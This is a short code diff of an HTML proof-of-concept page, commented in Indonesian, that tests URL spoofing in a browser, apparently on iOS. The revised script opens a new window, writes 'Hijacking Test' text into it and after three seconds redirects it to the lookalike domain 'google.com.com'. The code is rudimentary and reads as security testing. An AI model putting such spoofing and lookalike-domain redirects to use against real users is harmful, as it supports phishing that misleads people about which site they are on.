@@ -1,28 +1,21 @@
 <html>
 <head>
-  <title>Test URL Spoofing PoC</title>
+  <title>iOS URL Spoofing PoC</title>
   <script>
     function spoofURL() {
-      let newWindow = window.open("about:blank", "_blank");
-      newWindow.document.write(`
-        <html>
-          <head><title>Suspicious Page</title></head>
-          <body>
-            <h1>URL Spoofing Test</h1>
-            <p>This page will simulate a URL spoofing attempt.</p>
-            <script>
-              setTimeout(function() {
-                window.location.href = 'https://www.example.com'; // Ganti dengan URL target
-              }, 2000); // Redirect setelah 2 detik
-            </script>
-          </body>
-        </html>
-      `);
+      // Membuka tab baru dengan URL palsu
+      let newWindow = window.open("about:blank", "spoofWindow");
+      newWindow.document.write("<h1>Hijacking Test</h1><p>If successful, we will see a spoofed URL.</p>");
+      
+      setTimeout(function() {
+        // Mengubah URL tab baru setelah beberapa detik
+        newWindow.location.replace('https://www.google.com.com'); // URL spoofed
+      }, 3000);
     }
   </script>
 </head>
 <body>
-  <h1>Click below to test URL Spoofing</h1>
-  <a href="javascript:void(0);" onclick="spoofURL()">Click to Test</a>
+  <h1>Click to test URL spoofing</h1>
+  <button onclick="spoofURL()">Click to Test</button>
 </body>
 </html>
